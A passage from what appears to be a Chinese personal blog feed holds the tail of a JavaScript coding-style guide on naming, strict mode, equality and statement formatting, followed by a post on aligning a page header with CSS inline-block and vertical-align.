class="keyword">var</span> accountNumber = <span class="string">"8401-1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">var</span> AccountNumber = <span class="string">"8401-1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：动词开头</span></span><br><span class="line"><span class="keyword">var</span> getAccountNubber = <span class="string">"8401-1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：使用下划线</span></span><br><span class="line"><span class="keyword">var</span> account_number = <span class="string">"8401-1"</span>;</span><br></pre></td></tr></table></figure><p>函数命名也应当采用驼峰命名格式。函数名的第一个单词应当是动词（而非名词）来避免同变量混淆。函数名中最好不要使用下划线。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：大写字母开头</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DoSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：名词开头</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">car</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：使用下划线</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// coed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常量（值不会被改变的变量）的命名应当是所有字母大写，不同单词之间用单个下划线隔开。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> TOTAL_COUNT = <span class="number">10</span>;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 不好的写法：驼峰形式</span></span><br><span class="line"><span class="keyword">var</span> totalCount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不好的写法：混合形式</span></span><br><span class="line"><span class="keyword">var</span> total_COUNT = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>对象的属性同变量的命名规则相同。对象的方法同函数的命名规则相同。如果属性或者方法是私有的，应当在之前加一个下划线。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//好的写法</span></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    _count: <span class="number">10</span>,</span><br><span class="line">    </span><br><span class="line">    _getCount: function() [</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p>严格模式应当仅限在函数内部使用，千万不要在全局使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：全局使用严格模式</span></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你期望在多个函数中使用严格模式而不需要多次声明“use strict”，可以使用立即被调用的函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// code</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">doSomethingElse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// code</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; ());</span><br></pre></td></tr></table></figure><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>当给变量赋值时，如果右侧是含有比较语句的表达式，需要用圆括号包裹。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> flag = (i &lt; count);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法</span></span><br><span class="line"><span class="keyword">var</span> flag = i &lt; count;</span><br></pre></td></tr></table></figure><h3 id="等号运算符"><a href="#等号运算符" class="headerlink" title="等号运算符"></a>等号运算符</h3><p>使用===（严格相等）和！==（严格不相等）待地==（相等）和！=（不等）来避免弱类型转换错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> same = (a === b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：使用==</span></span><br><span class="line"><span class="keyword">var</span> same = (a == b);</span><br></pre></td></tr></table></figure><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>三元运算符应当仅仅用在条件赋值语句中，而不要作为if语句的替代品。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> value = condition ? value1 : value2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：没有赋值，应当使用 if 表达式</span></span><br><span class="line">condition ? doSomething() : doSomethingElse();</span><br></pre></td></tr></table></figure><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><h4 id="简单语句"><a href="#简单语句" class="headerlink" title="简单语句"></a>简单语句</h4><p>没一行最多只包含一条语句。所有的简单的语句都应该以分号（；）结束。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line">count++;</span><br><span class="line">a = b;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：多个表达式写在一行</span></span><br><span class="line">count++; a = b;</span><br></pre></td></tr></table></figure><h4 id="返回语句"><a href="#返回语句" class="headerlink" title="返回语句"></a>返回语句</h4><p>返回语句当返回一个值得时候不应当使用圆括号包括，除非在某些情况下这么做可以让返回值更容易理解。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collection.size();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (size &gt; <span class="number">0</span> ? size : defaultSize);</span><br></pre></td></tr></table></figure><h4 id="符合语句"><a href="#符合语句" class="headerlink" title="符合语句"></a>符合语句</h4><p>符合语句是大括号起来的语句列表。</p><ul><li>括起来的语句应当较符合语句多缩进一个层级。</li><li>开始的大括号应当在符合语句所在行的末尾；结尾的大括号应当独占一行切同符合语句的开始保持同样的缩进。</li><li>当语句是控制结构的一部分是，诸如if或者for语句，所有语句都需要用大括号括起来，也包括单个语句。这个约定使得我们更方便的添加语句而不用担心忘记加括号而引起bug。</li><li>想if一样的语句开始的关键词，其后应该紧跟一个空格，其实大括号应当在空格之后。</li></ul><h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><p>if语句应当是下面的格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绝不允许在if语句中省略花括号。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：不恰当的空格</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：遗漏花括号</span></span><br><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    doSomething();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：所有代码写在一行</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123; doSomething(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：所有代码写在一行且没有花括号</span></span><br><span class="line"><span class="keyword">if</span> (condition) doSomething();</span><br></pre></td></tr></table></figure><h4 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h4><p>for类型的语句应当是下面的格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; condition; update) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (variable <span class="keyword">in</span> object) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for语句的初始化部分不应当有变量声明。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> i,</span><br><span class="line">    len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, len = <span class="number">10</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：初始化时候声明变量</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="number">10</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：初始化时候声明变量</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> prop <span class="keyword">in</span> object) &#123;</span><br><span class="line">    <span class="comment">// code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单使用for-in语句时，记得使用hasOwnproperty（）进行双重检查来过滤出对象的成员。</p><h4 id="while、do语句"><a href="#while、do语句" class="headerlink" title="while、do语句"></a>while、do语句</h4><p>while类的语句应当是下面的格式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do类的语句应当是下面的格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">while</span> (condition);</span><br></pre></td></tr></table></figure><h4 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h4><p>switch类的语句应当是如下格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> expression:</span><br><span class="line">        statements</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>switch下的每一个case都应当保持一个缩进。除第一个之外包括default在内的每一个case都应当在之前保持一个空行。每一组语句（出来default）都应当以break、return、throw结尾，或者用一行注释表示跳过。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">switch</span> (value) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/* falls through */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        doSomething();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"this shouldn't happen."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果一个switch语句不包含default情况，应当用一行注释代替。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">switch</span> (value) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/* falls through */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        doSomething();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 没有default</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="try语句"><a href="#try语句" class="headerlink" title="try语句"></a>try语句</h4><p>try类的语句应当格式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">catch</span> (variable) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">catch</span> (variable) &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="留白"><a href="#留白" class="headerlink" title="留白"></a>留白</h3><p>在逻辑相关的代码块之间添加空行可以提高代码的可读性。</p><p>两行空行仅限在如下情况中使用。</p><ul><li>在不同的源代码文件之间。</li><li>在类和接口定义之间。</li></ul><p>单行空行仅限在如下情况中使用。</p><ul><li>方法之间。</li><li>方法中局部变量和第一行语句之间。</li><li>多行或者当行注释之前。</li><li>方法中逻辑代码块之间以提升代码的可读性。</li></ul><p>空格应当在如下情况中使用。</p><ul><li>关键词后跟括号的情况应当用空格隔开。</li><li>参数列表中逗号之后应当保留一个空格。</li><li>所有的除了点（.）之外的二元运算符，其操作数应当用空格隔开。单目运算符的操作数之间不应该用空白隔开，诸如一元减号，递增（++），递减（–）。</li><li>for语句中的表达式之间应当用空格隔开。</li></ul><h3 id="需要避免的"><a href="#需要避免的" class="headerlink" title="需要避免的"></a>需要避免的</h3><ul><li>切勿使用像String一类的原始包装类型创建新的对象。</li><li>避免使用eval()（避免注入攻击）。</li><li>避免使用with语句。该语句自严格模式下不复存在，可能在未来的ECMAScript标准中将去除</li></ul><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>也许你会觉得谈这些没有用，还不如花时间多解决一些技术上的问题，但我觉得，代码规范就好比是你的字体，字体龙飞凤舞，你认为你写的东西能给阅读者多少享受？传递多少感情？人不可能脱离群体，编程也可能永远单干，如果你写的代码别人看不懂或者很难看懂，那对于团队合作开发来说那将是怎么样的一个灾难？</p><p>一开始就规范自己的代码，终归是没有错的！（小子以为）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;实习3个月，从代码渣渣到现在的代码还是渣渣，参与了公司实际项目开发，却深受代码不规范的危害。结构混乱，代码藕隅严重，书写格式千奇百怪，开发起
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="学习" scheme="http://blog.minfive.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="代码规范" scheme="http://blog.minfive.com/tags/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    
  </entry>
  
  <entry>
    <title>基于Inline-Block布局+vertical-Align的研究</title>
    <link href="http://blog.minfive.com/2016/03/22/%E5%9F%BA%E4%BA%8EInline-Block%E5%B8%83%E5%B1%80-vertical-Align%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <id>http://blog.minfive.com/2016/03/22/基于Inline-Block布局-vertical-Align的研究/</id>
    <published>2016-03-21T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：这个探究主要源于ife任务6的一个布局困扰，继而产生以下这些探究及结论，如解释有误或有新的见解，请及时与我联系，谢谢大家的捧场。</p></blockquote><hr><h3 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h3><p>有需求才会有解决方案，那么，这个需求是什么呢？</p><p>这是任务6布局的两个点</p><p><img src="http://blog.static.minfive.com/post/16-03-22/issue-01.png" alt="img1"><br><img src="http://blog.static.minfive.com/post/16-03-22/issue-02.png" alt="img2"></p><p><code>review</code>了许多同学的代码，实现方式基本局限于两种，<code>position</code>定位、<code>float+内外边距</code>再者就是两者结合，那么又没有第三种更为简单的适合的方法呢？<br>答案是有的，那就是基于<code>inlink-block</code>+<code>vertical-align</code>的方式</p><h3 id="inline-block-vertical-align"><a href="#inline-block-vertical-align" class="headerlink" title="inline-block + vertical-align"></a>inline-block + vertical-align</h3><p>什么是<code>inline-block</code>相信大家比我还要清楚，但用来布局的话还有几个重要的点需要大家着重注意的：</p><blockquote><ul><li>inline-block是行内块级元素，因此这种布局仅适用于单排布局（这点大家应该不会有太多异议吧）</li><li>inline-block布局+vertical-align的关键点在于<code>valign特性</code>的使用，因此对于<code>vertical-align</code>的理解尤为关键（具体可参照<a href="http://www.zhangxinxu.com/wordpress/2010/05/%E6%88%91%E5%AF%B9css-vertical-align%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%E4%B8%8E%E8%AE%A4%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="noopener">张鑫旭大神关于vertical-align的理解</a>）</li></ul></blockquote><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>基于上述技术，我写了一个新的解决方法，具体如下：</p><p>html代码部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-mark"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>ife.baidu.com<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-date"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>2016.03<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css代码部分：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*头部*/</span></span><br><span class="line"><span class="selector-class">.header</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">vertical-align</span>: bottom;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="selector-class">.header-mark</span>&#123;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">110px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">61px</span>;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#d45d5c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.header-mark</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">        <span class="attribute">content</span>:<span class="string">''</span>;</span><br><span class="line">        <span class="attribute">line-height</span>: <span class="number">58px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.header-mark</span>&gt;<span class="selector-tag">span</span>&#123;</span><br><span class="line">        <span class="attribute">vertical-align</span>: bottom;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.header-date</span>&#123;</span><br><span class="line">        <span class="attribute">float</span>:right;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">61px</span>;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#d45d5c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.header-date</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">        <span class="attribute">content</span>:<span class="string">''</span>;</span><br><span class="line">        <span class="attribute">line-height</span>: <span class="number">58px</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">0.5em</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.header-date</span>&gt;<span class="selector-tag">span</span>&#123;</span><br><span class="line">        <span class="attribute">vertical-align</span>: bottom;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原理其实很简单，利用伪元素去做基准线，然后其它元素以伪元素为基准进行排布，方便快捷，更重要的是这种方式维护起来也跟方便</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><blockquote><p>第一次写学习笔记，写的不好的地方请大家多多包涵，也请大家不吝啬给出意见，共同学习，共同进步，谢谢大家！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：这个探究主要源于ife任务6的一个布局困扰，继而产生以下这些探究及结论，如解释有误或有新的见解，请及时与我联系，谢谢大家的捧场。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;问题引入&quot;&gt;&lt;a href=&quot;#问题引入&quot; cla
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="学习" scheme="http://blog.minfive.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
